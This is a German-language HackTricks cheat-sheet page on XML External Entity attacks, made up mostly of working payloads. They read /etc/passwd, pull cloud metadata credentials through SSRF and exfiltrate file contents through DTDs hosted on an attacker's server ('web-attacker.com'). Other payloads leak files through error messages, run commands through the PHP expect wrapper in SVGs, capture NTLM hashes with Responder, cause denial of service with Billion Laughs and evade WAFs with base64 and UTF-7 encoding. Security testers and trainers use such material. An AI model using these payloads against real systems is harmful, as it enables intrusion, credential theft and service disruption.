# XXE - XEE - XML External Entity

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## XML-Grundlagen

XML ist eine Auszeichnungssprache, die f√ºr die Speicherung und den Transport von Daten entwickelt wurde und eine flexible Struktur aufweist, die die Verwendung von beschreibend benannten Tags erm√∂glicht. Es unterscheidet sich von HTML, da es nicht auf eine Reihe vordefinierter Tags beschr√§nkt ist. Die Bedeutung von XML hat mit dem Aufstieg von JSON abgenommen, trotz seiner urspr√ºnglichen Rolle in der AJAX-Technologie.

* **Datenrepr√§sentation durch Entit√§ten**: Entit√§ten in XML erm√∂glichen die Darstellung von Daten, einschlie√ülich Sonderzeichen wie `&lt;` und `&gt;`, die `<` und `>` entsprechen, um Konflikte mit dem Tag-System von XML zu vermeiden.
* **Definition von XML-Elementen**: XML erm√∂glicht die Definition von Elementtypen, die beschreiben, wie Elemente strukturiert sein sollten und welchen Inhalt sie enthalten k√∂nnen, von beliebigem Inhalt bis zu spezifischen Unterelementen.
* **Document Type Definition (DTD)**: DTDs sind in XML entscheidend, um die Struktur des Dokuments und die Arten von Daten, die es enthalten kann, zu definieren. Sie k√∂nnen intern, extern oder eine Kombination sein und zeigen, wie Dokumente formatiert und validiert werden.
* **Benutzerdefinierte und externe Entit√§ten**: XML unterst√ºtzt die Erstellung benutzerdefinierter Entit√§ten innerhalb einer DTD zur flexiblen Datenrepr√§sentation. Externe Entit√§ten, die mit einer URL definiert sind, werfen Sicherheitsbedenken auf, insbesondere im Zusammenhang mit XML External Entity (XXE)-Angriffen, die die Art und Weise ausnutzen, wie XML-Parser externe Datenquellen verarbeiten: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **XXE-Erkennung mit Parameterentit√§ten**: Zur Erkennung von XXE-Schwachstellen, insbesondere wenn herk√∂mmliche Methoden aufgrund von Sicherheitsma√ünahmen des Parsers versagen, k√∂nnen XML-Parameterentit√§ten verwendet werden. Diese Entit√§ten erm√∂glichen Out-of-Band-Erkennungstechniken, wie das Ausl√∂sen von DNS-Lookups oder HTTP-Anfragen an eine kontrollierte Domain, um die Schwachstelle zu best√§tigen.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Hauptangriffe

[**Die meisten dieser Angriffe wurden mit den gro√üartigen Portswiggers XEE-Labors getestet: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Neuer Entit√§tstest

In diesem Angriff werde ich testen, ob eine einfache neue ENTIT√ÑTSdeklaration funktioniert.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### Datei lesen

Lassen Sie uns versuchen, `/etc/passwd` auf verschiedene Arten zu lesen. F√ºr Windows k√∂nnten Sie versuchen zu lesen: `C:\windows\system32\drivers\etc\hosts`

In diesem ersten Fall beachten Sie, dass SYSTEM "_\*\*file:///\*\*etc/passwd_" ebenfalls funktionieren wird.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Dieser zweite Fall sollte n√ºtzlich sein, um eine Datei zu extrahieren, wenn der Webserver PHP verwendet (nicht der Fall bei den Portswigger Labs)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
In diesem dritten Fall beachten wir, dass wir das `Element stockCheck` als ANY deklarieren.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (750).png>)

### Verzeichnis auflisten

In **Java**-basierten Anwendungen ist es m√∂glicherweise m√∂glich, den Inhalt eines Verzeichnisses √ºber XXE mit einem Payload wie diesem aufzulisten (nur nach dem Verzeichnis fragen anstelle der Datei):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Ein XXE k√∂nnte verwendet werden, um einen SSRF in einer Cloud zu missbrauchen
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Mit der **zuvor kommentierten Technik** k√∂nnen Sie den Server dazu bringen, auf einen von Ihnen kontrollierten Server zuzugreifen, um dessen Verwundbarkeit aufzuzeigen. Wenn das jedoch nicht funktioniert, liegt es m√∂glicherweise daran, dass **XML-Entit√§ten nicht erlaubt sind**. In diesem Fall k√∂nnten Sie versuchen, **XML-Parameterentit√§ten** zu verwenden:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Daten au√üerhalb des Bandes exfiltrieren

**In diesem Fall lassen wir den Server eine neue DTD mit einer b√∂sartigen Nutzlast laden, die den Inhalt einer Datei √ºber einen HTTP-Request sendet (**f√ºr **mehrzeilige Dateien k√∂nnten Sie versuchen, sie √ºber** _**ftp://**_ **mit diesem einfachen Server zu exfiltrieren, zum Beispiel [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Diese Erkl√§rung basiert auf** [**Portswiggers Lab hier**](https://portswigger.net/web-security/xxe/blind)**.**

In der b√∂sartigen DTD werden eine Reihe von Schritten durchgef√ºhrt, um Daten zu exfiltrieren:

### Beispiel f√ºr b√∂sartige DTD:

Die Struktur ist wie folgt:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Die von dieser DTD ausgef√ºhrten Schritte umfassen:

1. **Definition von Parameter Entities:**
   * Es wird eine XML-Parameter-Entity `%file` erstellt, die den Inhalt der Datei `/etc/hostname` liest.
   * Eine weitere XML-Parameter-Entity `%eval` wird definiert. Sie deklariert dynamisch eine neue XML-Parameter-Entity `%exfiltrate`. Die `%exfiltrate`-Entity wird so eingestellt, dass sie eine HTTP-Anfrage an den Server des Angreifers sendet und den Inhalt der `%file`-Entity im Query-String der URL √ºbergibt.
2. **Ausf√ºhrung von Entities:**
   * Die `%eval`-Entity wird verwendet, was zur Ausf√ºhrung der dynamischen Deklaration der `%exfiltrate`-Entity f√ºhrt.
   * Anschlie√üend wird die `%exfiltrate`-Entity verwendet, um eine HTTP-Anfrage an die angegebene URL mit den Dateiinhalten auszul√∂sen.

Der Angreifer hostet diese b√∂sartige DTD auf einem Server unter seiner Kontrolle, normalerweise unter einer URL wie `http://web-attacker.com/malicious.dtd`.

**XXE-Payload:** Um eine verwundbare Anwendung auszunutzen, sendet der Angreifer einen XXE-Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Diese Payload definiert eine XML-Parameterentit√§t `%xxe` und bindet sie in die DTD ein. Wenn diese Payload von einem XML-Parser verarbeitet wird, ruft sie die externe DTD vom Server des Angreifers ab. Der Parser interpretiert dann die DTD inline, f√ºhrt die in der b√∂sartigen DTD beschriebenen Schritte aus und f√ºhrt zur Ausschleusung der Datei `/etc/hostname` an den Server des Angreifers.

### Fehlerbasiert (Externe DTD)

**In diesem Fall werden wir den Server dazu bringen, eine b√∂sartige DTD zu laden, die den Inhalt einer Datei in einer Fehlermeldung anzeigt (dies ist nur g√ºltig, wenn Sie Fehlermeldungen sehen k√∂nnen).** [**Beispiel von hier.**](https://portswigger.net/web-security/xxe/blind)

Eine XML-Analysierungsfehlermeldung, die den Inhalt der Datei `/etc/passwd` offenbart, kann durch eine b√∂sartige externe Document Type Definition (DTD) ausgel√∂st werden. Dies wird durch die folgenden Schritte erreicht:

1. Eine XML-Parameterentit√§t namens `file` wird definiert, die den Inhalt der Datei `/etc/passwd` enth√§lt.
2. Eine XML-Parameterentit√§t namens `eval` wird definiert, die eine dynamische Deklaration f√ºr eine weitere XML-Parameterentit√§t namens `error` enth√§lt. Diese `error`-Entit√§t versucht beim Auswerten, eine nicht vorhandene Datei zu laden, wobei sie den Inhalt der `file`-Entit√§t als Namen verwendet.
3. Die `eval`-Entit√§t wird aufgerufen, was zur dynamischen Deklaration der `error`-Entit√§t f√ºhrt.
4. Der Aufruf der `error`-Entit√§t f√ºhrt zu einem Versuch, eine nicht vorhandene Datei zu laden, was eine Fehlermeldung erzeugt, die den Inhalt der Datei `/etc/passwd` als Teil des Dateinamens enth√§lt.

Die b√∂sartige externe DTD kann mit dem folgenden XML aufgerufen werden:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **Fehlerbasiert (System DTD)**

Was ist mit blinden XXE-Schwachstellen, wenn **Out-of-Band-Interaktionen blockiert sind** (externe Verbindungen nicht verf√ºgbar sind)?.

Eine Schlupfloch in der XML-Sprachspezifikation kann **sensible Daten durch Fehlermeldungen offenlegen, wenn die DTD eines Dokuments interne und externe Deklarationen mischt**. Dieses Problem erm√∂glicht die interne Neudefinition von extern deklarierten Entit√§ten und erleichtert die Ausf√ºhrung von fehlerbasierten XXE-Angriffen. Solche Angriffe nutzen die Neudefinition einer XML-Parameterentit√§t aus, die urspr√ºnglich in einer externen DTD deklariert wurde, innerhalb einer internen DTD. Wenn Out-of-Band-Verbindungen vom Server blockiert werden, m√ºssen Angreifer auf lokale DTD-Dateien zur√ºckgreifen, um den Angriff durchzuf√ºhren, mit dem Ziel, einen Parsfehler zu verursachen, um sensible Informationen offenzulegen.

Betrachten Sie ein Szenario, in dem das Dateisystem des Servers eine DTD-Datei unter `/usr/local/app/schema.dtd` enth√§lt, die eine Entit√§t namens `custom_entity` definiert. Ein Angreifer kann einen XML-Parsingfehler induzieren, der die Inhalte der Datei `/etc/passwd` offenbart, indem er eine hybride DTD wie folgt einreicht:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Die umrissenen Schritte werden von dieser DTD ausgef√ºhrt:

* Die Definition einer XML-Parameterentit√§t mit dem Namen `local_dtd` enth√§lt die externe DTD-Datei, die sich auf dem Dateisystem des Servers befindet.
* Eine Neudefinition erfolgt f√ºr die XML-Parameterentit√§t `custom_entity`, die urspr√ºnglich in der externen DTD definiert wurde, um einen [fehlerbasierten XXE-Exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) zu umschlie√üen. Diese Neudefinition ist darauf ausgelegt, einen Parsfehler hervorzurufen, der den Inhalt der Datei `/etc/passwd` offenlegt.
* Durch Verwendung der Entit√§t `local_dtd` wird die externe DTD einbezogen, die die neu definierte `custom_entity` umfasst. Diese Abfolge von Aktionen f√ºhrt zur Ausgabe der Fehlermeldung, die vom Exploit angestrebt wird.

**Beispiel aus der realen Welt:** Systeme, die die GNOME-Desktop-Umgebung verwenden, haben oft eine DTD unter `/usr/share/yelp/dtd/docbookx.dtd`, die eine Entit√§t namens `ISOamso` enth√§lt.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (622).png>)

Da diese Technik eine **interne DTD verwendet, m√ºssen Sie zuerst eine g√ºltige finden**. Sie k√∂nnten dies tun, indem Sie dasselbe **Betriebssystem / dieselbe Software installieren**, die der Server verwendet, und **einige Standard-DTDs suchen**, oder **eine Liste** von **Standard-DTDs** in Systemen **abrufen** und **√ºberpr√ºfen**, ob eine davon existiert:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
F√ºr weitere Informationen siehe [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Auffinden von DTDs im System

In dem folgenden gro√üartigen Github-Repo findest du **Pfade von DTDs, die im System vorhanden sein k√∂nnen**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Dar√ºber hinaus, wenn du das **Docker-Image des Opfersystems** hast, kannst du das Tool desselben Repos verwenden, um das **Image zu scannen** und den Pfad der im System vorhandenen **DTDs zu finden**. Lies das [Readme des Githubs](https://github.com/GoSecure/dtd-finder), um zu erfahren, wie.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE √ºber Office Open XML-Parser

F√ºr eine ausf√ºhrlichere Erkl√§rung dieses Angriffs, **√ºberpr√ºfen Sie den zweiten Abschnitt** [**dieses erstaunlichen Beitrags**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **von Detectify**.

Die F√§higkeit, **Microsoft Office-Dokumente hochzuladen, wird von vielen Webanwendungen** angeboten, die dann bestimmte Details aus diesen Dokumenten extrahieren. Beispielsweise kann eine Webanwendung Benutzern erm√∂glichen, Daten durch Hochladen einer Tabelle im XLSX-Format zu importieren. Damit der Parser die Daten aus der Tabelle extrahieren kann, muss er zwangsl√§ufig mindestens eine XML-Datei analysieren.

Um diese Schwachstelle zu testen, ist es notwendig, eine **Microsoft Office-Datei mit einem XXE-Payload zu erstellen**. Der erste Schritt besteht darin, ein leeres Verzeichnis zu erstellen, in das das Dokument entpackt werden kann.

Nachdem das Dokument entpackt wurde, sollte die XML-Datei unter `./unzipped/word/document.xml` in einem bevorzugten Texteditor (wie vim) ge√∂ffnet und bearbeitet werden. Die XML sollte so ge√§ndert werden, dass der gew√ºnschte XXE-Payload eingef√ºgt wird, der oft mit einer HTTP-Anfrage beginnt.

Die ge√§nderten XML-Zeilen sollten zwischen den beiden Wurzel-XML-Objekten eingef√ºgt werden. Es ist wichtig, die URL durch eine √ºberwachbare URL f√ºr Anfragen zu ersetzen.

Schlie√ülich kann die Datei gezippt werden, um die b√∂sartige poc.docx-Datei zu erstellen. Aus dem zuvor erstellten "unzipped"-Verzeichnis sollte der folgende Befehl ausgef√ºhrt werden:

Nun kann die erstellte Datei auf die potenziell gef√§hrdete Webanwendung hochgeladen werden, und man kann auf eine Anfrage in den Burp Collaborator-Protokollen hoffen.

### Jar: Protokoll

Das **jar**-Protokoll ist ausschlie√ülich in **Java-Anwendungen** verf√ºgbar. Es ist darauf ausgelegt, den Dateizugriff innerhalb eines **PKZIP**-Archivs (z. B. `.zip`, `.jar`, usw.) zu erm√∂glichen und sowohl lokale als auch entfernte Dateien zu bedienen.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Um auf Dateien innerhalb von PKZIP-Dateien zugreifen zu k√∂nnen, ist es **sehr n√ºtzlich, XXE √ºber System-DTD-Dateien zu missbrauchen.** √úberpr√ºfen Sie [diesen Abschnitt, um zu lernen, wie man System-DTD-Dateien missbraucht](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Der Prozess, um auf eine Datei innerhalb eines PKZIP-Archivs √ºber das jar-Protokoll zuzugreifen, umfasst mehrere Schritte:

1. Es wird eine HTTP-Anfrage gestellt, um das Zip-Archiv von einem bestimmten Ort wie `https://download.website.com/archive.zip` herunterzuladen.
2. Die HTTP-Antwort, die das Archiv enth√§lt, wird vor√ºbergehend auf dem System gespeichert, normalerweise an einem Ort wie `/tmp/...`.
3. Das Archiv wird dann extrahiert, um auf dessen Inhalt zuzugreifen.
4. Die spezifische Datei innerhalb des Archivs, `file.zip`, wird gelesen.
5. Nach der Operation werden alle tempor√§ren Dateien, die w√§hrend dieses Prozesses erstellt wurden, gel√∂scht.

Eine interessante Technik, um diesen Prozess im zweiten Schritt zu unterbrechen, besteht darin, die Serververbindung unbegrenzt offen zu halten, w√§hrend das Archiv bereitgestellt wird. Tools, die in [diesem Repository](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) verf√ºgbar sind, k√∂nnen f√ºr diesen Zweck genutzt werden, einschlie√ülich eines Python-Servers (`slow_http_server.py`) und eines Java-Servers (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Das Schreiben von Dateien in einem tempor√§ren Verzeichnis kann dazu beitragen, **eine andere Schwachstelle zu eskalieren, die einen Pfadtraversierungsvorfall beinhaltet** (wie z.B. lokale Dateieinschlie√üung, Vorlageninjektion, XSLT RCE, Deserialisierung, usw.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Billion Laugh Angriff
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml-Angriff
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Quadratischer Blowup-Angriff

![](<../.gitbook/assets/image (524).png>)

#### Abrufen von NTML

Auf Windows-Hosts ist es m√∂glich, den NTML-Hash des Webserver-Benutzers zu erhalten, indem ein responder.py-Handler festgelegt wird:
```bash
Responder.py -I eth0 -v
```
und durch das Senden der folgenden Anfrage
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Versteckte XXE-Oberfl√§chen

### XInclude

Bei der Integration von Client-Daten in serverseitige XML-Dokumente, wie sie in Backend-SOAP-Anfragen verwendet werden, ist die direkte Kontrolle √ºber die XML-Struktur h√§ufig begrenzt, was herk√∂mmliche XXE-Angriffe aufgrund von Einschr√§nkungen bei der √Ñnderung des `DOCTYPE`-Elements behindert. Ein `XInclude`-Angriff bietet jedoch eine L√∂sung, indem externe Entit√§ten innerhalb eines beliebigen Datenelements des XML-Dokuments eingef√ºgt werden k√∂nnen. Diese Methode ist selbst dann wirksam, wenn nur ein Teil der Daten innerhalb eines servergenerierten XML-Dokuments kontrolliert werden kann.

Um einen `XInclude`-Angriff auszuf√ºhren, muss der `XInclude`-Namespace deklariert und der Dateipfad f√ºr die beabsichtigte externe Entit√§t angegeben werden. Nachfolgend finden Sie ein pr√§gnantes Beispiel, wie ein solcher Angriff formuliert werden kann:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
√úberpr√ºfen Sie [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) f√ºr weitere Informationen!

### SVG - Datei-Upload

Dateien, die von Benutzern in bestimmte Anwendungen hochgeladen und dann auf dem Server verarbeitet werden, k√∂nnen Schwachstellen in der Behandlung von XML- oder XML-enthaltenden Dateiformaten ausnutzen. G√§ngige Dateiformate wie Office-Dokumente (DOCX) und Bilder (SVG) basieren auf XML.

Wenn Benutzer **Bilder hochladen**, werden diese Bilder serverseitig verarbeitet oder validiert. Selbst f√ºr Anwendungen, die Formate wie PNG oder JPEG erwarten, k√∂nnte die **Bibliothek zur Bildverarbeitung des Servers auch SVG-Bilder unterst√ºtzen**. SVG, als XML-basiertes Format, kann von Angreifern ausgenutzt werden, um b√∂sartige SVG-Bilder zu √ºbermitteln und den Server somit anf√§llig f√ºr XXE (XML External Entity)-Schwachstellen zu machen.

Ein Beispiel f√ºr einen solchen Angriff wird unten gezeigt, bei dem ein b√∂sartiges SVG-Bild versucht, Systemdateien zu lesen:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Eine weitere Methode besteht darin, zu versuchen, Befehle √ºber den PHP-"expect"-Wrapper auszuf√ºhren:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
In beiden F√§llen wird das SVG-Format verwendet, um Angriffe zu starten, die die XML-Verarbeitungsf√§higkeiten der Server-Software ausnutzen, was die Notwendigkeit einer robusten Eingabevalidierung und Sicherheitsma√ünahmen verdeutlicht.

√úberpr√ºfen Sie [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) f√ºr weitere Informationen!

**Beachten Sie, dass die erste Zeile der gelesenen Datei oder des Ergebnisses der Ausf√ºhrung INNERHALB des erstellten Bildes erscheint. Sie m√ºssen also auf das Bild zugreifen k√∂nnen, das SVG erstellt hat.**

### **PDF - Datei-Upload**

Lesen Sie den folgenden Beitrag, um zu erfahren, wie man eine XXE ausnutzt, um eine PDF-Datei hochzuladen:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Von x-www-urlencoded zu XML

Wenn eine POST-Anfrage die Daten im XML-Format akzeptiert, k√∂nnten Sie versuchen, eine XXE in dieser Anfrage auszunutzen. Zum Beispiel, wenn eine normale Anfrage Folgendes enth√§lt:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Dann k√∂nnten Sie m√∂glicherweise die folgende Anfrage senden, mit demselben Ergebnis:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Von JSON zu XEE

Um die Anfrage zu √§ndern, k√∂nnten Sie eine Burp-Erweiterung namens "**Content Type Converter**" verwenden. [Hier](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) finden Sie dieses Beispiel:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Eine weitere Beispiel finden Sie [hier](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Schutzmechanismen Umgehen

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Dies funktioniert nur, wenn der XML-Server das `data://`-Protokoll akzeptiert.

### UTF-7

Sie k√∂nnen die \[**"Encode Recipe**" von Cyberchef hier ]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) Transformation in UTF-7 durchf√ºhren.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Datei:/ Protokollumgehung

Wenn die Website PHP verwendet, k√∂nnen Sie anstelle von `file:/` **PHP-Wrapper** `php://filter/convert.base64-encode/resource=` verwenden, um auf **interne Dateien zuzugreifen**.

